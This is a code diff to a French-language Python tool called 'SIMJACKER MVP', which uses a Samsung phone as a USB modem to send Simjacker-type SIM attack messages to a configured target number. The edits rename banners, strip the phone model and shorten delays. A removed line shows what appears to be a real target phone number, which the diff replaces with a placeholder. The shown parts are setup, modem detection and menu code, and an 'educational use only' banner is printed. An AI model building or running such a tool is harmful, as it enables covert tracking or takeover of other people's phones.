@@ -2,11 +2,11 @@
 # -*- coding: utf-8 -*-
 """
 ================================================================================
-SIMJACKER EXPERT MVP - Version Professionnelle
+SIMJACKER MVP - Version Professionnelle
 ================================================================================
 Auteur: Expert OSINT & Sécurité Télécom
 Date: 2026
-Compatibilité: Ubuntu 22.04/24.04 avec Samsung A15 en mode modem
+Compatibilité: Ubuntu 22.04/24.04 avec Samsung en mode modem
 
 Ce script unique intègre :
 - Connexion automatique au modem GSM via USB
@@ -17,7 +17,7 @@ Ce script unique intègre :
 - Interface interactive pour debug
 
 Utilisation :
-  1. Active le mode modem/débogage USB sur le Samsung A15
+  1. Active le mode modem/débogage USB sur le Samsung 
   2. Connecte le téléphone au PC
   3. Lance ce script
   4. Suis le menu interactif
@@ -44,10 +44,10 @@ from urllib.parse import urlparse
 # =====================================================================
 CONFIG = {
     # ----- NUMÉRO CIBLE -----
-    "NUMERO_CIBLE": "+243839898872",      # 🔴 À CHANGER
+    "NUMERO_CIBLE": "+243XXXXXXXXX",      # 🔴 À CHANGER
     
     # ----- CONFIGURATION MODEM -----
-    "MODEM_PORT": "/dev/ttyACM0",          # Port du Samsung A15 (ajuster si besoin)
+    "MODEM_PORT": "/dev/ttyACM0",          # Port du Samsung (ajuster si besoin)
     "MODEM_BAUD": 115200,                   # Vitesse de communication
     "TIMEOUT_MODEM": 5,                     # Timeout pour les commandes AT
     
@@ -59,8 +59,8 @@ CONFIG = {
     "TAGS": [0x24, 0x26, 0x2A, 0x2C, 0xD0, 0x12, 0x14, 0x16],
     
     # ----- TIMINGS -----
-    "DELAI_ENTRE_TAGS": 60,                  # Pause entre chaque test
-    "TIMEOUT_ATTENTE": 300,                   # Attente max après envoi
+    "DELAI_ENTRE_TAGS": 30,                  # Pause entre chaque test
+    "TIMEOUT_ATTENTE": 150,                   # Attente max après envoi
 }
 
 # =====================================================================
@@ -79,7 +79,7 @@ class ModemManager:
         """Tente de détecter automatiquement le port du modem"""
         print("\n🔍 Détection du modem...")
         
-        # Liste des ports possibles pour Samsung A15
+        # Liste des ports possibles pour Samsung 
         ports_possibles = [
             "/dev/ttyACM0", "/dev/ttyACM1",
             "/dev/ttyUSB0", "/dev/ttyUSB1",
@@ -116,7 +116,7 @@ class ModemManager:
         
         print("   ❌ Aucun modem détecté.")
         print("\n📋 ACTIONS REQUISES:")
-        print("   1. Active le mode développeur sur le Samsung A15")
+        print("   1. Active le mode développeur sur le Samsung ")
         print("   2. Active 'Débogage USB' et 'Mode modem USB'")
         print("   3. Vérifie la connexion avec: ls /dev/ttyACM*")
         return False
@@ -469,7 +469,7 @@ class SimJackerExpert:
     def menu(self):
         """Affiche le menu principal"""
         print("\n" + "="*70)
-        print("🚀 SIMJACKER EXPERT MVP - MENU PRINCIPAL")
+        print("🚀 SIMJACKER MVP - MENU PRINCIPAL")
         print("="*70)
         print(f"📱 Cible: {CONFIG['NUMERO_CIBLE']}")
         print(f"🎯 Tags à tester: {len(CONFIG['TAGS'])}")
@@ -653,7 +653,7 @@ class SimJackerExpert:
 # =====================================================================
 if __name__ == "__main__":
     print("\n" + "="*70)
-    print("🚀 SIMJACKER EXPERT MVP - SYSTÈME ULTIME")
+    print("🚀 SIMJACKER MVP - SYSTÈME")
     print("="*70)
     print("⚠️  USAGE ÉDUCATIF UNIQUEMENT - RESPECTE LES LOIS")
     print("="*70)
